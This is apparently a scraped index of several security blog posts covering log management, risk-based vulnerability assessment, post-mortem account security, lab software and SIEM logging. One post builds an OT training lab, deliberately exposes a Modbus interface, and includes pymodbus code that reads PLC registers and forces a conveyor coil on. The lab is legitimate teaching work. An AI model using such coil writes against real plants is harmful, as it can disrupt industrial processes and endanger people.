and information security events.\nEven if GDPR does not specifically mention log collection, Art.5 refers to the ability to demonstrate:\nThe controller shall be responsible for, and be able to demonstrate compliance with, paragraph 1 (\u0026lsquo;accountability\u0026rsquo;).\nMoreover in Italy, we have a special mention about logging (Amministratori di Sistema or AdS, and AGID minimal requirements):\nCaratteristiche di mantenimento dell´integrità dei dati raccolti dai sistemi di log sono in genere disponibili nei più diffusi sistemi operativi, o possono esservi agevolmente integrate con apposito software. Il requisito può essere ragionevolmente soddisfatto con la strumentazione software in dotazione, nei casi più semplici, e con l´eventuale esportazione periodica dei dati di log su supporti di memorizzazione non riscrivibili. In casi più complessi i titolari potranno ritenere di adottare sistemi più sofisticati, quali i log server centralizzati e \u0026ldquo;certificati\u0026rdquo;. Tuttavia il provvedimento del Garante non affronta questi aspetti, prevedendo soltanto, come forma minima di documentazione dell´uso di un sistema informativo, la generazione del log degli \u0026ldquo;accessi\u0026rdquo; (login) e la loro archiviazione per almeno sei mesi in condizioni di ragionevole sicurezza e con strumenti adatti, in base al contesto in cui avviene il trattamento, senza alcuna pretesa di instaurare in modo generalizzato, e solo con le prescrizioni del provvedimento, un regime rigoroso di registrazione degli usage data dei sistemi informativi. Le misure minime sono un importante supporto metodologico, oltre che un mezzo attraverso il quale le Amministrazioni, soprattutto quelle più piccole e che hanno meno possibilità di avvalersi di professionalità specifiche, possono verificare autonomamente la propria situazione e avviare un percorso di monitoraggio e miglioramento.\nEven if the mention is specific to Italian companies, it makes sense: we all should be able to review systems and users\u0026rsquo; activities regularly or during an incident analysis. Being able to demonstrate what is happened in an incident, means we have our infrastructures (and data) under control. That\u0026rsquo;s the GDPR accountability principle.\nHow do we collect logs? We know that any well-designed system and application implements local logging by default. Having dozens, hundreds, or thousands of log sources means we must collect logs in a central location. Otherwise, we will spend days just correlating events between different systems. Moreover, if a system is compromised, logs are probably compromised too.\nSo we need:\nto collect logs from multiple sources in central storage; that timestamps are coherent; categorize logs based on the content (debug logs, administrative events, errors\u0026hellip;); set retention based on log category (we probably want to discard debug logs after a few days, whereas we want to maintain administrative logs for months); preserve CIA attributes (Confidentiality, Integrity, Availability); to normalize and correlate logs based on usernames, IP addresses, timestamp, source\u0026hellip; And we probably want to collect logs from:\nsecurity appliances and applications (firewall, EDR, WAF, NAC, IDS/IPS\u0026hellip;); ingress and egress web gateways (load balancer, web proxy\u0026hellip;); authentication systems (LDAP, Active Directory, remote access, servers, endpoints, appliances\u0026hellip;); network services (DHCP, DNS\u0026hellip;); application; \u0026hellip; What do we do with logs? We are collecting logs, not for compliance, but because they have a value. We can use them to:\nanalyze application errors (new bugs after a software release); highlight anomalies (potential attacks, data exfiltration); review activities (verify administrator logs for permission abuse); analyze root cause (problem management); threat hunting (find ongoing attacks); activate automatic alerting and reporting. We are realizing that maybe we don\u0026rsquo;t need a simple log collector, maybe we need a SIEM because most of the tasks we expect to are about security management (threat hunting, finding users abusing permissions\u0026hellip;). The answer is yes: we do log analysis because of security purposes. We are also collecting application logs for debugging, but they serve for security too.\nEven so, we probably want to evaluate log collectors because:\nwe have to review user activities (GDPR requisite); we want to debug applications and network issues (they are security incidents too, but rarely managed by SOC). SIEM solutions are usually more expensive and many companies have to decide which logs must be discarded. Ideally, the log management process should be almost fully automated:\nConclusions I am convinced that there is no distinction between incidents and security incidents. Because of the GDPR, any event impacting CIA attributes of personal data is a data violation (or data breach). Based on that most events are security potentially security events (we can discards debug and maybe informational events). With this idea any SOC should be able to identify cyber threats as well as network and application issues.\nBut the real world works differently and I know I\u0026rsquo;m an idealist.\nBesides that, we need to collect logs and improve alerting and reporting to obtain a resilient infrastructure. And this is part of the log management process.\nReferences Art. 5 GDPR Principles relating to processing of personal data System Administrator FAQ (Italian) Log Management Workflow (draw.io format) Guide to Computer Security Log Management (NIST 800-92) Minimal security requirements for public administrations (Italian) ","cover":"/images/categories/ciso.webp","permalink":"https://www.adainese.it/blog/2022/05/20/log-management-is-more-than-a-log-collector/","title":"Log management is more than a log collector"},{"categories":["ciso"],"contents":"In this article, I\u0026rsquo;m explaining why we are executing VA, why the traditional approach is dangerous and how we should manage the risk bound to vulnerabilities.\nI\u0026rsquo;m also discussing a few false myths about VA.\nI hope this article can help to approach the vulnerability management process by reducing the unmanaged risk bound to vulnerabilities.\nThe purpose of a VA Almost any company should request a yearly VA. To be honest they often request a VAPT (whatever it means). When I try to understand the reason behind this legitim request, I realize that this is not so clear. We are doing a VAPT every year because everybody does.\nSo, let\u0026rsquo;s start from the beginning: a Vulnerability Assessment (VA) is a measure. To be specific a VA counts the known vulnerabilities present in systems and applications. VA scanners are signature-based: if they find application X, they estimate vulnerability Y.\nYes, VA scanners estimate vulnerability, they don\u0026rsquo;t make any verification about them. Most modern VA scanners include DAST (Dynamic Application Security Testing): in other words scanners try to break Web applications and report estimated web vulnerabilities.\nFinally, VA scanners exclude any custom application and often exclude also popular web frameworks (WordPress, Drupal\u0026hellip;). The reason is simple: VA scanners rarely include signatures for a specific web application framework. There are other specialized scanners, for example, WordPress users should use specific scanners like wpscan The outcome of a VA is a list of detected vulnerabilities:\na risk estimated value is usually included per each vulnerability (VA are not context-aware); custom systems and applications are not evaluated (VA scanners do not include specific signatures); risk mitigations are not evaluated (VA is not context-aware). Legacy approach In a legacy VA approach, the outcome is the input of a patch management process: we know what is vulnerable, and we need to patch.\nWe have some issues with this approach:\nBlind patching: patching everything is not sustainable. In practice, IT teams start patching from the easiest using a best-effort approach. The result is that critical, mission-critical systems will be rarely patched (SAP, Oracle, CRM\u0026hellip;). Context-less: VA outcomes do not consider the in-place security controls. Systems and applications in a high-security zone are patched with the same urgency as the exposed services, just because they are affected by the same critical vulnerability. Time-to-patch: assuming a yearly VA, in the worst-case scenario, a critical patch could be considered 1 year after it has been released. Risk-based VA In a Risk-based approach, we are adding the context. The outcome of a VA must be enriched with:\nInherent risk: the risk bound to each specific vulnerability, excluding in place mitigations. Mitigation factor: how much the in-place security controls (firewalls, IPSs, WAFs\u0026hellip;) mitigate the risk. Residual risk: the risk bound to each specific vulnerability, considering all mitigation factors. We can calculate the inherent risk with: impact x likelihood.\nAll values are application-dependent, but we can simplify things and assume that:\nImpact depends on the vulnerable networks because once the network is compromised, all included systems can be compromised too. Likelihood depends on the vulnerability (available exploits, difficulty to exploits\u0026hellip;). Mitigation factor depends on the security zone because we can assume security controls are deployed equally to secure a specific set of networks. Residual risk is inherent risk x mitigation factor. We need to define another value, the risk appetite. The risk appetite is the risk value that the organization is willing to accept.\nUsing a Risk-based approach, the VA report is enriched (as we discussed before) and ordered by residual risk:\nVulnerabilities with a residual risk lower than or equal to the risk appetite are discarded. Vulnerability with a medium risk must be managed (for example) within 10 working days. Vulnerability with a critical risk must be managed (for example) within 3 working days. A risk-based approach is deterministic and doesn\u0026rsquo;t leave the risk unmanaged.\nFalse myth: provider rotation The first false myth I want to discuss is the provider rotation. Many organizations I know change the provider (the company that executes the VA) every year because they believe that a different partner will detect different vulnerabilities. This is wrong, because:\nVA providers use commercial software from Tenable, Rapid7\u0026hellip; I\u0026rsquo;m not saying that all are equals, I\u0026rsquo;m saying that changing the partner doesn\u0026rsquo;t mean that the tool is different. Even if I change the VA scanner every year, it\u0026rsquo;s unacceptable to discover vulnerabilities after one more year just because I changed the tool (unmanaged risk). Changing the tool means a different VA report format: to evaluate the process I need to correlate KPI between different tools (not so easy). False myth: VAPT Organizations are focusing on VAPT only, often referring to legacy VA. As we discussed before, VA scanners are not designed to detect all vulnerabilities that can affect organizations. VA scanners are a precious approach to fastly scanning large infrastructure within an acceptable time, but they are not designed to go deep.\nWe know that DAST can help, but they are still bound to a specific context.\nPT should be considered after the previous steps (VA and DAST) to evaluate critical custom services (HR portals, CRM\u0026hellip;).\nOrganizations that are limited to VA, are not managing the risk bound to custom applications.\nFalse myth: VA as a patch management tool We mentioned it before: with a yearly VA, we can have unmanaged vulnerabilities for one year (worst case scenario). We can reduce the interval but unless we are executing complete VA every week, we need a different approach.\nA working vulnerability management process requires discovering, prioritizing, and remediating vulnerabilities.\nVA can be used in the discovery phase, but the right input came from vendor security feeds (Microsoft, Cisco, Red Hat\u0026hellip;). We should:\nobtain new vulnerabilities on a daily basis; evaluate the associated risk; define how we can mitigate (patching, additional security controls\u0026hellip;). Using this approach VAs are used to verify the vulnerability management process, not to start it. Of course, this approach depends on other processes like asset and software management, and change management.\nDIY and automate I\u0026rsquo;m an automation-addicted guy, and I\u0026rsquo;m used to automating any boring process I can. In my perspective, large organizations should be able to execute VAs by themselves. And they should automate them from the scan phase to the report phase, including most of the risk assessment considerations.\nLet\u0026rsquo;s try to design the process:\nAsset and software inventories contain what is running within the Organization. Inventories also contain the impact score (the business asset value). We can estimate a mitigation factor for each security zone, calculated taking into account in place security controls (firewalls, IPSs, WAFs\u0026hellip;). We know that this is not accurate, but it can initially work. Based on asset and software inventories, we can get relevant vulnerabilities from vendor feeds. Based on the estimated risk score (usually provided by vendors), we can calculate the inherent risk and alert report medium and critical vulnerabilities. An analyst should analyze the report and define the next steps. Conclusions We learned how to move from the legacy VAPT approach to a risk-based vulnerability management process. We know that it\u0026rsquo;s not so easy, but we know that the legacy approach is leaving the risk unmanaged. VA scanners are valuable tools if used in the right way. They are dangerous if we are using them as the single input for the vulnerability management process.\nReferences Vulnerability Management Workflow (draw.io format) ","cover":"/blog/2022/05/18/the-value-of-a-risk-based-va/va-report.webp","permalink":"https://www.adainese.it/blog/2022/05/18/the-value-of-a-risk-based-va/","title":"The value of a Risk Based VA"},{"categories":["personal-security"],"contents":"In the last few years, I started to work (pro bono) on a different topic: personal digital security. In this post, I want to discuss post-mortem security: how to minimize family threats after death.\nMy concern is related to email security: what a malicious actor can do if he can access my mailbox? He could access, via password recovery, multiple attached accounts (e.g. social networks, e-commerce, utilities\u0026hellip;). Many of those accounts could affect family security.\nThe obvious solution requires planning the death: giving instructions and passwords to relatives, so they can properly manage accounts. But it\u0026rsquo;s not so simple:\nrelatives could not have the right skills to properly handle accounts; accounts could be closed without notice. This post summarizes some thoughts I made while listening to The Privacy, Security, and OSINT Show Podcast by Micheal Bazzel , especially on episode 259 .\nPost mortem risks When an email account is dismissed, it could be impersonated by a malicious actor pretending to be the original owner.\nThe above post is a good example of what a malicious actor can do. And no particular skill is required to do that. Just find interesting domains and pick up some interesting ones. Reactivate the domain, register a catch-all domain address and impersonate the original owner. Try to recover associated accounts, and present yourself as the original owner\u0026hellip;\nScary, at least to me.\nDomain/Service/Account retirement But death is not the only event we should care about. Maybe a service could be retired, an account suspended, closed, or migrated to other users.\nCTemplar is closing and the last day of operation for this email service will be on May 26 of 2022.\nIn some cases we could lose an Interned Domain too:\n(EU) Domain names that are not reinstated will remain suspended until 30 June 2021. They will then be withdrawn as from 1 July 2021. On 1 January 2022, all the withdrawn domain names will be revoked. They will then start to be made available for registration by other entities.\nSolutions I didn\u0026rsquo;t find any good solutions yet. I currently evaluating two scenarios \u0026amp; solutions.\nRobust 3rd party email account In this scenario, I\u0026rsquo;m using a large email account provider (e.g. Google). I\u0026rsquo;m assuming:\nthe domain (e.g. gmail.com) won\u0026rsquo;t be closed for years; the account won\u0026rsquo;t be reused (maybe closed/suspended but not reused). In this scenario, after death, nobody can access my email account for years, except the ones that have specific instructions to do that (username, password, token).\nThis solution does not cover:\nunexpected account suspension/closure. In this case, I need to migrate all associated accounts to another email. Doable, even if boring.\nPersonal domain with email sub-addressing In this scenario, I\u0026rsquo;m using a personal domain account (e.g. adainese.it). I\u0026rsquo;m assuming:\nI\u0026rsquo;m registering a domain with the TLD associated with the country I live in (let\u0026rsquo;s avoid another .EU style scenario); I\u0026rsquo;m using sub-addressing (see later). We know that sooner or (hopefully) later, the domain won\u0026rsquo;t be renewed and thus it will be available to anyone. We also know that sooner or later our domain will be part of a data breach, and associated with our physical identity.\nWe could use sub-addressing to minimize the risk associated with password recovery. Sub-addressing allows you to use the + symbol to create multiple aliases, so you could use yourname+randomstring@example.com as the email address.\nIs this enough? Not really, because sooner or later the service provider will send any unsolicited email uncovering the email address used to log in.\nConclusions In my point of view, there is no final solution yet. Both solutions could be used, both minimize different risks and leave open others.\nReferences Sieve Email Filtering: Subaddress Extension Registering and renewing .eu domain names in the UK CTemplar is shutting down Expired domain threat scenario The Privacy, Security, and OSINT Show ","cover":"/blog/2022/05/11/post-mortem-account-security/impersonating.webp","permalink":"https://www.adainese.it/blog/2022/05/11/post-mortem-account-security/","title":"Post-mortem account security"},{"categories":["unetlab"],"contents":"My previous post about the UNetLab story become unexpectedly popular. UNetLab has been one of my most important and public projects, and I\u0026rsquo;m honored so many people all around the world used my homemade project.\nIf I left the project in 2015, UNetLab is still in my mind, and sometimes I *speculate- on the next UNetLab version. So that\u0026rsquo;s the post: let\u0026rsquo;s speculate about what we (I\u0026rsquo;m including you), would like to see in a hypothetical next virtual lab software.\nAdditional note: in the last years I moved from networking to automation and finally to the Cybersecurity world, so my needs changed as you can read in the paragraphs below. But I don\u0026rsquo;t want to focus only on my needs. The \u0026ldquo;U\u0026rdquo; in UNetLab stands for \u0026ldquo;Unified\u0026rdquo;.\nUNetLabv1 limits Let\u0026rsquo;s recap the UNetLab limits:\nper host pod limit: currently each host can run up to 256 independent pods, because of the console port limit; per lab node limit: currently each pod/lab can run up to 128 - 1 nodes, because of the console port limit; per user pod limit: currently each user can run up to one pod/lab at a time, because of the console port limit; one host only: currently there is no way to make a distributed installation of UNetLab (OVS could be used, but many frame types are filtered by default); config management: getting and putting startup-config is done through expecting scripts, they are slow, non-predictive, and cannot cover all node types; Dynamips serial interfaces are not supported; no topology change is allowed while the lab is running, by design. The console port limit happen because each node console have a fixed console port, calculated as following: ts_port = 32768 + 128 - tenant_id + device_id. Moreover, no more than 512 IOL nodes can run inside the same lab because device_id must be unique for each tenant.\nUNetLabv3 wishing So in my mind, and because of my job, a hypothetical UNetLabv2 must be able to:\nTeaching: multi-tenancy: each teacher should be able to manage an independent environment; classes: within each tenant, users are divided into classes (class-level visibility); users should be able to start and (possibly) modify their lab (user-level visibility); shared access: users could access the same running lab; design mode: changing a lab should not affect running copies and any lab could be converted into a \u0026ldquo;template\u0026rdquo;; solo-mode: non-teacher should still be able to write and run labs without worrying about classes, students\u0026hellip; (most of the UNetLab users are using it for themselves); content writer: labs should include additional content (slides, video\u0026hellip; Udemy style); auto-evaluation: teacher could include scripts to auto-evaluate users. Labbing: live changes (jitter, delay, interface up/down), should immediately reflect the running lab; serial interfaces (also between IOU and Dynamips). Marketplace: a place where users and teachers can share labs and learning paths (Udemy style). Automation: all relevant nodes within a lab should be able to be reached by automation software by default. Packet capture: users should be able to capture packets from any specific interface (the old UNetLab doesn\u0026rsquo;t have this capability). Scale-out: labs could be run on multiple computing nodes; Support for: images: IOL, Dynamips, Docker, VM; hypervisor: Linux QEMU/KVM and VMware vSphere. Open source and community-driven. Implementation So, how would I approach the above prerequisites? Let\u0026rsquo;s try to speculate:\nteaching - multi-tenancy: easy, I used the same approach with UNetLabv1; teaching - classes: easy, it\u0026rsquo;s just a sort of \u0026ldquo;nested\u0026rdquo; multi-tenancy (users - classes - tenants); teaching - shared access and design mode: easy, just need to clone the lab and assign it to the user; teaching - design mode: easy, just copy all running nodes as template lab (same tenant scope); teaching - solo mode: easy, it\u0026rsquo;s the design mode; labbing - live changes: not all images support interface status and jitter/delay features must be implemented; labbing - serial interfaces: hard, a packet manager must translate communication between IOL and Dynamips (not sure it makes sense); marketplace: hard, it requires competencies (mind that I\u0026rsquo;m not a developer) and infrastructure; automation: medium, if all images come with a pre-configured management interface, the back-end should assign and track MAC/IP addresses (maybe a DNS service is needed too); packet capture: easy, the logic already supports that; scale-out: hard, see later; support - images: easy, UNetLabv1 already support them, but not sure Dynamips still make sense; support - hypervisor: medium, it requires redesigning the provisioning framework (in my mind Ansible could be a good tool). a community-driven: hard, with UNetLabv1 I failed to make a community and collaborators. Scale-out and multi-hypervisor I spent hours figuring out how to scale out and support multiple hypervisors. I want to support VMware vSphere because it\u0026rsquo;s popular inside data centers and enterprises could use the same infrastructure dedicated to R\u0026amp;D. I want to support QEMU/KVM too because they are more flexible and they can emulate a sort of \u0026ldquo;virtual\u0026rdquo; L1 links. For example: creating an LACP channel on vSphere is not possible because LACP frames are dropped by default; on Linux, I can patch the kernel to switch any frame (UNetLabv1 includes this kernel patch).\nExtending a lab between different computing nodes opens a question: how to extend \u0026ldquo;virtual\u0026rdquo; L1 links? In the UNetLabv2 approach, I decided to approach this problem by implementing a sort of MPLS encapsulation. This approach has some limits:\nit\u0026rsquo;s slow because switching is done at the user level (not kernel level); it\u0026rsquo;s complex; it\u0026rsquo;s completely proprietary (vSphere will never support that). So I chose a different approach:\nthe infrastructure is responsible to extend L2 networks (VLAN) using any technology available (VXLAN, Cisco OTV or ACI, VMware NSX\u0026hellip;); the UNetLabv3 nodes use 802.1Q trunks to send data between nodes; \u0026ldquo;virtual\u0026rdquo; L1 links are allowed only on QEMU/KVM nodes and only within the same node; trunking L2 links are allowed only within the same node; nodes on different computing nodes can communicate using specific dedicated VLANs (tagged by the computing nodes). With this approach, users can design labs and optimize them to span between multiple computing servers. Moreover, any DCI technology can be used regardless of the vendor/provider\u0026hellip; UNetLabv3 is simply not implementing DCI, it\u0026rsquo;s just using what the infrastructure provides.\nOther considerations Many prerequisites I described above require a sort of automation tool. To be more specific I need that:\nusers can connect to the lab and can route packets through the lab reaching all nodes (not only for automation labs but also for Cyber-range); node consoles, when applicable, must be provided in a terminal-server style (I don\u0026rsquo;t like HTML5 consoles too much); DNS/NTP/DHCP services are provided in each lab (I\u0026rsquo;d love to automatically assign an FQDN to any running node). In my mind in each lab is deployed a special (gateway) node, responsible for the console and the routing. OpenVPN is used by users to connect to the gateway node. I have to check if OpenVPN supports VRF or if multiple OpenVPN instances are required to support multi-tenancy. The gateway could use OSPF to receive lab networks and originate a default gateway route.\nConclusions Developing UNetLab was one of the best hobbies I ever had. I met a lot of interesting people, most of them I\u0026rsquo;m still in touch with. Moreover, it allowed me to understand how critical is to maintain software used all around the world without disappointing users because of a bug. But even so, sometimes I dream about developing UNetLab again.\nBut, as you know, I\u0026rsquo;m just speculating\u0026hellip;\nIf you have additional prerequisites I didn\u0026rsquo;t consider, drop me an email or write me on LinkedIn .\n","cover":"/blog/2022/04/20/speculating-about-unetlabv3/topology.webp","permalink":"https://www.adainese.it/blog/2022/04/20/speculating-about-unetlabv3/","title":"Speculating about UNetLabv3"},{"categories":["security"],"contents":"A few months ago a customer asked me about how to integrate custom applications and SIEM. The customer developed a Java application using a Tomcat container and the question came from an insurance company.\nCustom applications Any service-oriented enterprise I know develops business applications by itself. I would say that most of them are still using Java EE with Tomcat and/or JBoss. All applications I reviewed used logging for diagnostic: application event/error logs are used to troubleshoot transactions and user behavior. In other words, logging is used to find out issues and bugs.\nHardly anyone takes care of writing security events. That\u0026rsquo;s a cultural problem: considering the history of ICT, Cyber-threats are a recent phenomenon that most stakeholders are unaware of.\nIdentifying threats For the sake of this post, the question is not about how to modify the application, but about which events we should log. This is not a new topic at all, and speaking about application security we should mention OWASP.\nOWASP AppSensor is a framework used to develop Java-based \u0026ldquo;self-defending applications\u0026rdquo;. Even if the project is outdated and unmaintained, the guidelines are a good starting point to identify events that should be logged. The OWASP AppSensor Guide describes 8 case studies identifying useful events that should be logged.\nOn page 35, for example, an e-commerce B2C application is described as finding three objectives:\nIdentify attacks as soon as possible and track how they evolve. Identify attacks against the application logic (catalog, cart, payments). Identify attacks against the database logic (SQL injection). The guide continues suggesting how to improve the application visibility: each event type must have a threshold beyond a security exception should be raised.\nThere to start from Changing enterprise core applications is a critical topic: adding or changing functions could add an unsustainable latency which could badly impact the user experience. Moreover, most enterprise applications cannot log everything because the amount of logging will be soon unmanageable.\nA risk-based approach, once again, helps to identify which events should be accounted for: a financial application has different requirements than a CMS.\nChapter 14 helps us to develop a self-defending application. We can see on page 51 some events we should consider:\nfailed authentication (I failed to login); failed authorization (I\u0026rsquo;m trying to access a content I do have not the privilege of); invalid user input (I\u0026rsquo;m typing something I should not); code injection (e.g. SQL Injection); high usage (I\u0026rsquo;m exceeding the expected page/function rate within 5 minutes). In my opinion, the above 5 events should be logged on any application.\nFinally, logs are useless if they cannot be correlated: logging must use a specific format supported by SIEM. Otherwise, nobody will manually read them line by line.\nRASP solutions RASP (Runtime Application Self-Protection) is the ready-to-be-used framework that adds security and visibility features: a custom library should be added to the application to automatically enable self-defend capabilities. OWASP AppSensor was a good open-source example.\nRASP is not WAF (Web Application Firewall): WAF analyzes user-application interaction, RASP verify also the impact on the application itself. In other words, RASP can also see how the application behaves.\nA SANS pager compares WAFs and RASP AppDefend from HP.\nHonestly, I place WAFs and RASPs into two different security layers: they use a different logic and require a different approach. Speaking about RASP I see pros and cons:\nPro: implemented quickly and wide SIEM compatibility. Cons: expensive and (small) latency. Serverless and PaaS applications There is a new emerging interesting topic: PaaS or serverless based application. Referring to applications delivered via PaaS or serverless functions, I can see that cloud providers are embedding many security features by default. Starting from logging, AWS and GCE embed a lot of logging functionalities by default. The problem is not about logging in a SIEM-compatible format, because this task is fulfilled by the cloud platform.\nThe open problem is about log monitoring (threat detection): even if some SIEM platforms are starting to integrate cloud platforms, I expect that cloud providers will offer soon ready-to-be-used SIEM with actionable insights (i.e. Google Chronicle ).\nConclusions In my daily work, I see that Cybersecurity awareness is increasing. Maybe months ago Cybersecurity was a topic confined to CISOs and Cyber-specialists; nowadays I see many non-tech organization units questioning me about Cybersecurity: OT managers and developers are asking how to make the world more secure. Not only because security is necessary, but also because it\u0026rsquo;s a competitive value.\nReferences OWASP AppSensor Guide ","cover":"/blog/2022/04/15/siem-ready-applications/appsensor.webp","permalink":"https://www.adainese.it/blog/2022/04/15/siem-ready-applications/","title":"SIEM ready applications"},{"categories":["ot-ics","security"],"contents":"As you probably know, I\u0026rsquo;m working on learning simulated lab for years. In the last couple of years, I moved to OT/ICS Cybersecurity, and sometimes I need a realistic lab to show the consequence of a Cyberattack targeting OT/ICS devices. Sometimes I can use a physical lab, sometimes not.\nAfter months, I think I found a good solution: it\u0026rsquo;s not a real PLC, but I can use it for POC, training, attack \u0026amp; defense scenarios.\nRequirements This lab requires:\n1 Windows VM running the plant (trough Factory I/O ) 1 Linux VM running the PLC (through OpenPLC Runtime ) 1 Windows engineering workstation (running OpenPLC Editor ) 1 Linux VM running the HMI (through ScadaBR ) 1 Linux attacker VM (running Kali ) Network topology We consider that the attacker owns a system placed in the same network where the PLC and HMI are.\nBuilding the lab The lab is pretty complex and we are splitting it into four phases:\nPLC and plant automation HMI attack PLC and plant Prepare a Windows VM and install Factory I/O . Place it into a dedicated (field) network.\nPrepare also a Linux VM with OpenPLC Runtime . Configure it with two NICs; connect them to the field network and the public network.\nIn the Factory I/O VM, open Factory I/O, open the first scene (From A to B):\nGo to File -\u0026gt; Options -\u0026gt; Licensing and activate the license (or the 30 days trial). Go to File -\u0026gt; Drivers and select Modbus TCP/IP Server. Attach sensors and actuators like the following:\nReview also the configuration but it should be OK by default:\nPort: 502 (default) Slave ID: 1 (default) I/O Points (offset/count): 0/2, 0/1, 0/0, 0/0 (depends on the scene) Open the OpenPLC Runtime web interface using the port 8080, username openplc and password openplc. Go to Slave Devices -\u0026gt; Add new device and configure it as follows:\nDevice Name: Factory I/O Device Type: Generic Modbus TCP Device Slave ID: (see Factory I/O driver) IP Address: (see Factory I/O driver) IP Port: (see Factory I/O driver) Start Addresses: (see Factory I/O driver) End Addresses: (see Factory I/O driver) Automation Prepare a Windows VM and install OpenPLC Editor . This function can be embedded on the PLC VM, but in a real factory, the automation software is developed on a dedicated Windows engineering workstation.\nOnce OpenPLC Editor is installed, open it and create a new project. In this post, we are using Function Block Diagram (FBD) language. Configure the following variables:\nName Class Type Location Initial Value Options Documentation Sensor Locale BOOL %IX100.0 Detect the object Conveyor Locale BOOL %QX100.0 Start/stop the conveyor Drag and drop both variables and create the FBD:\nWhile the sensor is not detecting the object (closed circuit) the conveyor is running (closed-circuit too).\nFinally, generate a program for OpenPLC Runtime, and upload it into the PLC controller using the OpenPLC Runtime web interface. Launch the program and when the compilation ends (Compilation finished successfully!), start the PLC. The output logs should be similar to the following:\nOpenPLC Runtime starting... Warning: Persistent Storage file not found Device Factory I/O is disconnected. Attempting to reconnect... Interactive Server: Listening on port 43628 Connected to MB device Factory I/O Issued start_modbus() command to start on port: 502 Server: Listening on port 502 Server: waiting for new client... Once the server is started, go back to the Factory I/O and start the simulation. The conveyor will move the object until the sensor detect it, then the conveyor will stop.\nHMI The final step requires implementing a Human Machine Interface (HMI). In the real world, engineers develop HMI using compiled code running on Windows. For our lab we are using web-based HMI SDK.\nConnect to ScadaBR VM using a browser and pointing to the right URL: http://SCADABR_IP:8080/ScadaBR/. Login with username admin and password admin (if needed you can connect via SSH with username scadabr and password scadabr).\nIn Data sources create a Modbus IP source as follows:\nName: OpenPLC Update period: 100ms Host: (see OpenPLC Runtime configuration) Port: (see OpenPLC Runtime configuration) Then add three points:\nPlant: name=DP_Running, slave_id=1, register_range=input, offset=801, settable=False, red=0, green=1 Sensor: name=DP_Sensor, slave_id=1, register_range=input, offset=800, settable=False, red=1, green=1 Conveyor: name=DP_Conveyor, slave_id=1, register_range=coil, offset=800, settable=True, empty=1, detected=0 Enable the above data sources and points by clicking on the status icon.\nMove now to the graphical view and:\nadd 3 binary graphics; configure them using the above points and a proper image set; save the view. The final output will be something like this:\nPreparing the scenario for a realistic attack OpenPLC is great software but it is pretty different from real ones: in practice, OpenPLC Runtime seems more robust than PLCs I find in real plants.\nFor the sake of this post, we want to make a vulnerable scenario so we can learn how to attack and defend plants. We are exposing the Factory I/O Modbus interface replacing OpenPLC Runtime. In the OpenPLC Runtime VM we need to make a destination NAT and enable routing:\nsudo apt-get install iptables-persistent sudo iptables -t nat -A PREROUTING -i ens32 -p tcp --dport 502 -j DNAT --to-destination FACTORYIO_IP sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE sudo iptables-save \u0026gt; /etc/iptables/rules.v4 sudo sysctl -w net.ipv4.ip_forward=1 sudo sed -i \u0026#39;s/^#net\\.ipv4\\.ip_forward=.*/net\\.ipv4\\.ip_forward=1/\u0026#39; /etc/sysctl.conf One more thing: the HMI points must be updated:\nPlant: name=DP_Running, slave_id=1, register_range=input, offset=801, settable=False, red=0, green=1 Sensor: name=DP_Sensor, slave_id=1, register_range=input, offset=800, settable=False, red=1, green=1 Conveyor: name=DP_Conveyor, slave_id=1, register_range=coil, offset=800, settable=True, empty=1, detected=0 You may want to restart ScadaBR after the changes.\nAttacking the PLC Let\u0026rsquo;s move now to the attack machine. We are using Python with pymodbus module. Let\u0026rsquo;s discover what is going on in the PLC (OpenPLC Runtime) while the simulation is running use the following script:\nimport time from pymodbus.client.sync import ModbusTcpClient as ModbusClient client = ModbusClient(\u0026#34;192.168.28.166\u0026#34;, port=502) client.connect() while True: print(\u0026#34;Coils: \u0026#34;, client.read_coils(0,8, unit=1).bits) print(\u0026#34;Discrete: \u0026#34;, client.read_discrete_inputs(0,8, unit=1).bits) print(\u0026#34;Holding: \u0026#34;, client.read_holding_registers(0, 8, unit=1).registers) print(\u0026#34;Input: \u0026#34;, client.read_input_registers(0,8, unit=1).registers) time.sleep(1) According to the output, captured while the plant is working, we can deduce that:\nSensor 0x1 holds the state of the plant (True if running, False if stopped) Sensor 0x0 holds the state of the Sensor (True if nothing is detected, False if the object is in place) Coil 0x0 acts on the Conveyor (True to make it run, False to stop it) With this information we can, for example, maintain the conveyor running:\nwhile True: client.write_coil(address=0, value=True, unit=1) Conclusions With this experiment, I\u0026rsquo;m proposing you an easy method to get your hands in the OT world. It\u0026rsquo;s complex, it\u0026rsquo;s different, and sometimes you will feel 30 years behind (pro and cons), but it\u0026rsquo;s something we have to deal with.\n","cover":"/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/factory-io-scene-1.webp","permalink":"https://www.adainese.it/blog/2022/04/03/virtual-plc-lab-for-cybersecurity-scenarios/","title":"Virtual PLC lab for Cybersecurity scenarios"},{"categories":["ciso"],"contents":"Nowadays (hopefully) all companies are executing regular vulnerability assessments. They often use different partners/tools each year and they often limit themselves to vulnerability assessments.\nVAs are not the end of a security strategy, they are just a small step at the beginning. And changing providers every year is not as useful as you think: in my opinion, there are more cons than pros.\nVAs do what has defined in the name: a vulnerability assessment. VA scanners just find and count network vulnerabilities. Once you have a VA report, you are doing vulnerability management, not patch or application life cycle management: those are different, concatenated processes.\nLet me say again:\nVA scanners are used in vulnerability management, not patch management.\nAnd:\nVA scanners are used in vulnerability management not in application life cycle management.\nWe mentioned three different processes:\nPatch Management: it\u0026rsquo;s about updating software to currently supported versions. Application life cycle management: it\u0026rsquo;s about disposing of or migrating legacy end-of-life applications. Vulnerability management: it\u0026rsquo;s about reducing the risk of known vulnerabilities. Patch management Patch management is the process of distributing and applying updates to the software. Patches correct errors (bugs) and sometimes bugs can lead to security issues (vulnerabilities). For the sake of this post, we are focusing on vulnerabilities: the bugs that can affect confidentiality, integrity, and/or availability (CIA). The same attributes are used in GDPR (Art.32.1.b):\nthe ability to ensure the ongoing confidentiality, integrity, availability, and resilience of processing systems and services;\nThe patch management process should describe:\nhow to be notified of a new software update; how to evaluate the risk of installing or not installing the software update; the SLA associated with the risk from the previous step; how to request the installation of the software update. Examples:\nCVE-2019-0708 (Bluekeep) : remote code execution vulnerability with CVSSv3 score of 9.8 for Microsoft Windows RDP CVE-2020-2021 : authentication bypass vulnerability with CVSSv3 score of 10 in Palo Alto Networks GlobalProtect. The first vulnerability affects Microsoft Windows systems with enabled RDP, the second one affects Palo Alto Networks GlobalProtect with enabled SAML authentication.\nWhich is the associated risk?\nOf course, it depends\u0026hellip; It depends on the vulnerable assets: where they are (network location), how they are protected (security 